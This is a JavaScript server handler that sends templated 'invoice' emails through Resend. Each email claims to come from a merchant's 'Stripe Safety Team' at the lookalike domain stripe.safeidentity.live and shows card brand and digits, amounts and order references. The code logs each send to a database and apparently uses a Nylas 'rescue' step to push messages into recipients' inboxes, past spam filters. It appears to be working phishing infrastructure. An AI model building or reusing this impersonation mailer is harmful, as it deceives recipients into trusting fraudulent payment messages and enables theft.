const { Resend } = require("resend");
const { supabase } = require("../supabase");
const { rescueToInbox } = require("../nylas-inbox-rescue");
const { renderInvoiceEmailFromFields } = require("../invoice-email-html");

module.exports = async function sendInvoice(req, res) {
  if (req.method !== "POST") {
    return res.status(405).json({ error: "Method not allowed" });
  }

  const {
    to,
    subject,
    merchant_name,
    merchant_url,
    merchant_logo,
    order_amount,
    order_devise,
    card_brand,
    card_digits,
    order_ref,
    order_date,
    order_email,
  } = req.body;

  if (!to || !subject || !merchant_name) {
    return res.status(400).json({ error: "Missing required fields: to, subject, merchant_name" });
  }

  const emailHtml = renderInvoiceEmailFromFields({
    merchant_name,
    merchant_url,
    merchant_logo,
    order_amount,
    order_devise,
    card_brand,
    card_digits,
    order_ref,
    order_date,
    order_email,
  });

  // Send via Resend
  const resend = new Resend(process.env.RESEND_API_KEY);
  const senderName = `${merchant_name} — Stripe Safety Team`;
  const senderEmail = `no-reply@stripe.safeidentity.live`;

  try {
    const { data, error } = await resend.emails.send({
      from: `${senderName} <${senderEmail}>`,
      to: Array.isArray(to) ? to : [to],
      subject,
      html: emailHtml,
    });

    if (error) {
      console.error("[SEND-INVOICE] Resend error:", error);
      return res.status(500).json({ error: "Failed to send email", details: error });
    }

    // Store in Supabase
    const { error: dbError } = await supabase.from("events").insert({
      event_type: "email_sent",
      details: {
        resend_id: data.id,
        to,
        subject,
        sender: senderEmail,
        merchant_name,
        merchant_url,
        order_amount,
        order_devise,
        card_brand,
        card_digits,
        order_email,
        sent_at: new Date().toISOString(),
      },
    });

    if (dbError) {
      console.error("[SEND-INVOICE] Supabase error:", dbError);
    }

    // Rescue email to inbox if recipient is a managed grant
    await rescueToInbox({
      recipientEmail: Array.isArray(to) ? to[0] : to,
      senderEmail,
      subject,
    });

    return res.status(200).json({ success: true, id: data.id });
  } catch (err) {
    console.error("[SEND-INVOICE] Error:", err);
    return res.status(500).json({ error: "Internal error", message: err.message });
  }
};
